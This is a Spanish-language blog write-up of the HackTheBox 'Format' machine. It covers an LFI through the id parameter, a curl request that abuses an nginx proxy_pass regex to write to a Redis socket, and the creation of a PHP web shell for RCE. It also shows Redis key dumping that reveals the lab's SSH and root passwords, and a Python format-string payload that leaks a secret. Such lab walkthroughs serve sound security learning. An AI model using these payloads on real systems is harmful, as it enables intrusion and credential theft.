---
layout: post
title: HackTheBox Format - LFI, Redis y Python format string
author: c4rta
date: 2023-06-12
##categories: [Maquinas, HackTheBox]
tags: [HTB, LFI, Python Format String]
image: /assets/img/htb-format/waifu.jpg
---

Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en "Pro", posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE

Para la flag de user nos volveremos a conectar por el socket a redis, para filtrar la contraseña de SSH, y para la escalada explotaremos una vulnerabilidad format string en python

{:.lead}

## Enumeracion

Iniciamos con un escaneo con:

```
sudo nmap -sS -n -Pn --open -p- 10.10.11.213
```

- sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

Ese puerto 3000 se ve curioso, asi que escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo:

```
nmap -sCV -p22,80,3000 10.10.11.213 
```

Vean como en el escaneo nos dice que el puerto 3000 nos redirecciona hacia ```microblog.htb:3000/```

![](/assets/img/htb-format/1.png)

Asi que lo agregamos al etc/hosts

```echo "10.10.11.213     microblog.htb" | tee -a /etc/hosts```

Y si accedemos por el puerto 80 nos redirecciona a ```app.microblog.htb```, asi que tambien lo agregamos al etc/hosts

![](/assets/img/htb-format/2.png)

```echo "10.10.11.213     app.microblog.htb" | tee -a /etc/hosts```

(les puedo decir que no hace falta hacer fuzzing de directorios y tampoco enumerar subdominios).

Ahora visitaremos la pagina web por el puerto 80, y al mostrar su codigo fuente vemos una URL que nos lleva a otro recurso

![](/assets/img/htb-format/3.png)

Al entrar, vemos que corresponde a Gitea, y tambien tenemos el repositorio del proyecto

![](/assets/img/htb-format/4.png)

Al ver un poco el codigo fuente, vemos que nos podemos registrar y nos mandara a la ruta ```/dashboard```, antes que nada, observa este codigo:

```php
    $redis = new Redis();
    $redis->connect('/var/run/redis/redis.sock');
    $username = $redis->HGET(trim($_POST['username']), "username");
    if(strlen(strval($username)) > 0) {
        header("Location: /register?message=User already exists&status=fail");
    }
    else {
        $redis->HSET(trim($_POST['username']), "username", trim($_POST['username']));
        $redis->HSET(trim($_POST['username']), "password", trim($_POST['password']));
        $redis->HSET(trim($_POST['username']), "first-name", trim($_POST['first-name']));
        $redis->HSET(trim($_POST['username']), "last-name", trim($_POST['last-name']));
        $redis->HSET(trim($_POST['username']), "pro", "false"); //not ready yet, license keys coming soon
        $_SESSION['username'] = trim($_POST['username']);
        header("Location: /dashboard?message=Registration successful!&status=success");
    }
```

Primero que nada crear una instancia de la clase ```Redis()``` llamada ```redis```, y establece una conexion usando el archivo ```/var/run/redis/redis.sock```, y en caso de que el usuario se haya registrado, se redireccionara a ```/dashboard``` con un mensaje de que se registro correctamente, como se puede ver:

![](/assets/img/htb-format/5.png)

Una vez en el dashboard, nos dejara crear un nuevo blog, que por la estructura, seria un subdominio de ```microblog.htb``` (tambien hay que agregarlo el /etc/hosts)

![](/assets/img/htb-format/6.png)


Tambien podemos ver que podemos editar nuestro blog, donde recibe dos datos, un header (h1) y un texto, en este punto interceptare la peticion con burp.

![](/assets/img/htb-format/7.png)

Vemos como nuestros datos se pasan por una peticion por POST, si volvemos a ver el codigo fuente, encontraremos las funciones que agregan el texto en ambos parametros

```php
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}
```
Primero vemos que cambia de directorio al directorio ```/content```, despues con ```$txt_nl = nl2br($_POST['txt']);``` convierte el valor recibido por el parametro ```txt``` al formato ```nl2br```, despues con ```$post_file = fopen("{$_POST['id']}", "w");``` se abre el archivo ```order.txt``` en modo escritura con el texto recibido por el parametro ```id```, y aca vemos lo mas interesante, con ```fwrite($post_file, $html);```, escribe como contenido HTML del archivo que se abrio anteriormente, es decir, lo que se reciba por el parametro ```id```, y despues, con ```order_file = fopen("order.txt", "a");``` y ```fwrite($order_file, $_POST['id'] . "\n");```, esta abriendo el archivo ```order.txt``` y esta escribiendo el contenido de lo que se recibio por el parametro id de la peticion. (saber esto es importante)

La conclusion a la que llegue, es que el archivo ```order.txt``` es el que contiene, o lleva el orden de las secciones que se van agregando cuando se edita un blog, las cuales posteriormente seran escritas como contenido HTML, de hecho, cuando ingresamos los datos en los campos para editar el blog, nos dice que se agrego una nueva secccion

![](/assets/img/htb-format/8.png)

En este punto decidi ver cuando y donde se hace el llamado a ```order.txt``` dentro del proyecto, en caso de que hayas descargado el proyecto y abierto en VScode, usa el atajo ```Ctrl + shift + f``` para buscar, y el primer resultado que me salio fue este codigo:

```php
function fetchPage() {
    chdir(getcwd() . "/content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}
```
Primero con ```chdir(getcwd() . "/content");``` cambia de dircectorio al directorio ```/content```, despues con ```$order = file("order.txt", FILE_IGNORE_NEW_LINES);``` esta leyendo el contenido de ```order.txt``` donde se usa ```FILE_IGNORE_NEW_LINES``` para decirle que omita una nueva linea al final de cada elemento del array, esto para que cada elemento de ```order.txt``` contenga una nueva linea dentro del array (seguramente te sacaste de onda por que dije array, y no se esta declarando ningun array, pero es por que asi funciona la funcion [file](https://www.phptutorial.net/php-tutorial/php-file/), ya que lee un archivo completo en un array), despues todo este codigo:

```php
$html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
```

Usa un foreach para recorrer cada elemento dentro del array que se guardo en ```order```, y hace varias cosas:

- Se guarda el valor de ```$html_content``` en ```$temp```
- A ```$html_content``` se le asigna el valor de ```$temp``` y demas se le concatena cada linea del array usando ```$line```, donde en cada linea se creara un elemento HTML(div), despues con ```file_get_contents()``` obtiene el contenido del archivo (order.txt) que corresponde a ```$line```, y por ultimo con ```return $html_content``` devuelve todo el HTML


### LFI (Local File Inclusion)

El LFI se encuentra en la funcion ```fetchPage()``` cuando se usa ```file_get_contents()```, ya que como mencione obtiene el contenido basandose en el archivo ```order.txt```, y que es lo que pasa, nosotros podemos controlar lo que se ingresa en ```order.txt``` por que como explique antes, el archivo ```order.txt``` tiene el texto recibido por el parametro ```id``` cuando editamos el blog cuando creamos una nueva seccion, asi que una vez sabiendo que el parametro ID es vulnerable a LFI, vamos a probar con ```../../../etc/passwd```, y si, defitivamente es vulnerable a LFI

![](/assets/img/htb-format/9.png)

Eso no es todo, si pasan Wappalyzer por la web, se daran cuenta que usa un servidor nginx, con un reverse proxy igual en nginx, asi que podemos usar el LFI para leer los archivos de configuracion del proxy, que en nginx se encuentran en ```/etc/nginx/sites-enabled/default``` y nos arroja algo como esto: 


### Reverse proxy misconfigurations

```
server { 
	listen 80; 
	listen [::]:80; 
	root /var/www/microblog/app; 
	index index.html index.htm index-nginx-debian.html; 
	server_name microblog.htb; 
	location / { 
		return 404; 
	} 
	location = /static/css/health/ { 
		resolver 127.0.0.1; 
		proxy_pass http://css.microbucket.htb/health.txt; 
	} 
	location = /static/js/health/ { 
		resolver 127.0.0.1; 
		proxy_pass http://js.microbucket.htb/health.txt; 
	} 
	location ~ /static/(.*)/(.*) { 
		resolver 127.0.0.1; 
		proxy_pass http://$1.microbucket.htb/$2; 
	}
}
```

Observa esta parte: 

```
	location ~ /static/(.*)/(.*) { 
		resolver 127.0.0.1; 
		proxy_pass http://$1.microbucket.htb/$2; 
	}
```

La expresion ```/static/(.*)/(.*)``` es usanda para hacer referencia a dos textos en una URL, donde cada ```(.*)``` corresponde a uno de los dos textos y se usa ```$1``` y ```$2``` para representarlos , por ejemplo, cuando se acceda a ```/static/directorio/nose.php``` la parte de ```/directorio``` estara asociada a ```$1``` y la parte de ```nose.php``` estaria asociada a ```$2```, y es una implementacion incorrecta en la directiva ```proxy_pass``` asi que nosotros podemos aprovecharnos de esa directiva para acceder a un acrhivo, pero... ¿A cual?

Si volvemos a revisar el codigo fuente, podemos ver una funcion que verifica si una cuenta de usuario en "Pro"

```php
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```
Con:

```php
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
```

Esta conectandose a Redis para establecer una conexion a travez del archivo ```/var/run/redis/redis.sock```.

Despues basicamente si el usuario tiene la propiedad "pro" establecida como "true", retorna "true", y si no, se retornará la cadena "false", y como tenemos un implementacion incorrecta en el proxy, entonces podemos interactuar con el archivo ```/var/run/redis/redis.sock``` para modificar los valores de la propiedad "pro", par convertir nuestra cuenta de usuario en pro, y lo podemos hacer de esta manera:

```curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:carta%20pro%20true%20a/b"```

Y nos debe de regresar algo como esto: 

![](/assets/img/htb-format/10_000.png)

Y ya somos pro

![](/assets/img/htb-format/11.png)

Y observa como ahora ya nos deja subir imagenes

## LFI to RCE

Si volvemos a revisar el codigo fuente para subir una imagen, vemos que si intentamos subir un php no va a funcionar por que se esta filtrando

```php
if (isset($_FILES['image']) && isset($_POST['id'])) {
    if(isPro() === "false") {
        print_r("Pro subscription required to upload images");
        header("Location: /edit?message=Pro subscription required&status=fail");
        exit();
    }
    $image = new Bulletproof\Image($_FILES);
    $image->setLocation(getcwd() . "/../uploads");
    $image->setSize(100, 3000000);
    $image->setMime(array('png'));

    if($image["image"]) {
        $upload = $image->upload();

        if($upload) {
            $upload_path = "/uploads/" . $upload->getName() . ".png";
            $html = "<div class = \"blog-image\"><img src = \"{$upload_path}\" /></div>";
            chdir(getcwd() . "/../content");
            $post_file = fopen("{$_POST['id']}", "w");
            fwrite($post_file, $html);
            fclose($post_file);
            $order_file = fopen("order.txt", "a");
            fwrite($order_file, $_POST['id'] . "\n");  
            fclose($order_file);
            header("Location: /edit?message=Image uploaded successfully&status=success");
        }
        else {
            header("Location: /edit?message=Image upload failed&status=fail");
        }
    }
}
```

Sin embargo como sabemos que tenemos un LFI en el parametro ID el cual escribe en order.txt, podriamos generar un archivo php el cual se guardara en la ruta ```$image->setLocation(getcwd() . "/../uploads");``` ya que el codigo anterior cambia de directorio para guardar ahi las imagenes, para generar el archivo en el parametro id debemos de poner ```/var/www/microblog/<tu_blog>/uploads/shell.php``` y en el parametro txt iria el comando que debemos de ejecutar, de esta manera

![](/assets/img/htb-format/12.png)

Asi que ahora al acceder al recurso: ```http://<tu_blog>.microblog.htb/uploads/shell.php``` podemos ver que el comando se ejecuto correctamente

![](/assets/img/htb-format/13.png)

Asi que solo quedar ejecutarnos una reverse shell y ya

![](/assets/img/htb-format/14.png)

## Flag de user

Si usamos pspy para buscar procesos intersantes, podemos ver que existe uno que se llama ```/usr/bin/redis-server```, como es un archivo de redis, podemos usar redis-cli -s para conectarnos y mandar comandos al servidor de redis, sin embargo, el ejecutarlo no sale nada aun que este esperando un comando:

![](/assets/img/htb-format/15.png)

Asi que podemos usar: ```echo "info" | redis-cli -s /var/run/redis/redis.sock``` para mostrar informacion del servidor, vemos como tiene establecido un ```keyspace```

![](/assets/img/htb-format/16.png)

Ahora podemos hacer uso de ```echo "keys *" | redis-cli -s /var/run/redis/redis.sock``` para devolver todas las claves almacenadas en la base de datos de Redis, y observa como tenemos una del usuario cooper:

![](/assets/img/htb-format/17.png)

Ahora usaremos ```echo "type cooper.dooper" | redis-cli -s /var/run/redis/redis.sock``` para devolver el tipo de valor que tiene la clave ```cooper.dooper```, para no poner otra imagen, es un hash, asi que usamos ```echo "hgetall cooper.dooper" | redis-cli -s /var/run/redis/redis.sock``` para que nos devuelva todos los valores asociados al hash de ```cooper.dooper```, y ahora ya obtuvimos la contraseña de cooper:

![](/assets/img/htb-format/18.png)

Ahora nos conectamos por ssh

**usr:** cooper

**pass:** zooperdoopercooper


## Escalada

Si ingresamos el comando ```sudo -l``` para ver que podemos ejecutar como root sin contraseña, tenemos un archivo

![](/assets/img/htb-format/19.png)

Al hacerle un cat, tenemos un archivo de python

```py
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

Podemos ver que recibe 3 argumentos:

```py
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
```

Y la parte interesante es esta al momento de generar la licencia para el usuario:

```py
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

- prefix, username y firstlast son unas partes de la licencia que se generara
- Con {license.license} y license=1, se le esta diciendo que acceda a un atributo en especifico del objeto el cual es una instancia de la clase Licence, donde el atributo es la licencia, como se puede ver aca 

```py
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()
```

- El ```format()``` se esta utilizando para reemplazar el valor de la posición 1 en la cadena de ```license```, con los valores que corresponde, es decir, el marcador de posición de ```{license.license}``` se reemplaza por el valor del atributo ```license``` de la clase ```License```, el cual viene como argumento por CLI, el problema es que mediante ```format()``` podemos acceder directamente a las propiedades de un objeto para obtener su valor, como por ejemplo, podemos acceder a los de la clase ```License```, sin embargo, el problema grave viene por que tambien podemos acceder directamenta a otros atributos fuera de la clase para recuperar el valor de cualquier otra variable o atributo que este en el programa, eso lo podemos hacer con ```__init__``` y ```__globals__```, ahora, guiandome de [aca](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) explotaremos esta vulnerabilidad, usaremos redis otra vez: ```redis-cli -s /var/run/redis/redis.sock```

Ahora dentro de redis, usaremos ```HMSET``` para establecer varios valores en una clave:

```
HMSET c4rta first-name "{license.__init__.__globals__[secret_encoded]}" last-name hola username c4rta
```

En este caso, estamos estableciendo first-name, last-name y username en la clave "c4rta" dentro de una estructura hash, y el valor que le asignamos a first-name es ```{license.init.globals[secret_encoded]}``` donde estamos llamando a ```secret_encoded``` el cual es una variable en el archivo que analizamos y el cual contiene la licencia, que vendria siendo la contraseña, como se ve aca:

```py
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
```
Asi que ahora si llamamos al archivo con la licencia ```c4rta``` nos debe de mostrar la contraseña de root ```sudo /usr/bin/license -p c4rta```

![](/assets/img/htb-format/20.png)

Y ya esta: la contraseña de root es ```unCR4ckaBL3Pa$$w0rd```

![](/assets/img/htb-format/21.png)

Eso ha sido todo, gracias por leer ❤
